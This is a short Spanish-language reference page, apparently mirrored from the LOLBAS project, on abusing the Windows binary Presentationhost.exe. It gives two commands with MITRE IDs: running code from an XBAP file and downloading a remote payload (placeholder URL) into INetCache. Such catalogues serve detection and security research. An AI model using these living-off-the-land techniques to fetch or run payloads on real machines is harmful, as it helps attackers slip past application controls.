# LOLBAS: Presentationhost.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`, `Execute`

File is used for executing Browser applications

## Comandos

### Execute code within XBAP files

Execute · priv: User · T1218

```cmd
Presentationhost.exe {PATH_ABSOLUTE:.xbap}
```

Executes the target XAML Browser Application (XBAP) file

### Downloads payload from remote server

Download · priv: User · T1105

```cmd
Presentationhost.exe {REMOTEURL}
```

It will download a remote payload and place it in INetCache.

